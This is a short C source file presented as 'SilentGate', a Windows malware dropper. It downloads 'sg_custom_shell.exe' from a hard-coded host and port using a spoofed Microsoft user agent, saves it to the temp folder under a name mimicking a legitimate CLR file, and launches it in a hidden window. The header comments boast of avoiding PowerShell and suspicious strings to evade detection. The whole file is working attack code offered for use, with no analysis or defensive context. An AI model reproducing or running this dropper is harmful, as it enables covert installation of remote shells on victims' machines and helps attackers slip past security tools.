/*
 * SilentGate - C Dropper
 * Author: JarDani
 * Downloads and executes payload via WinHTTP
 * No PowerShell. No suspicious strings.
 */
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

int main() {
    /* Target path - looks like legitimate CLR file */
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat(path, "clrjit_cfg.exe");

    /* Download via WinHTTP */
    HINTERNET hSession = WinHttpOpen(
        L"Microsoft-CryptoAPI/10.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) return 1;

    HINTERNET hConnect = WinHttpConnect(
        hSession, L"192.168.217.146",
        8080, 0);

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, L"GET",
        L"/output/sg_custom_shell.exe",
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    WinHttpReceiveResponse(hRequest, NULL);

    HANDLE hFile = CreateFileA(path,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD read = 0, written = 0;
    BYTE buf[4096];
    while (WinHttpReadData(hRequest, buf, sizeof(buf), &read) && read > 0)
        WriteFile(hFile, buf, read, &written, NULL);

    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    /* Execute */
    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    CreateProcessA(path, NULL, NULL, NULL,
        FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    return 0;
}
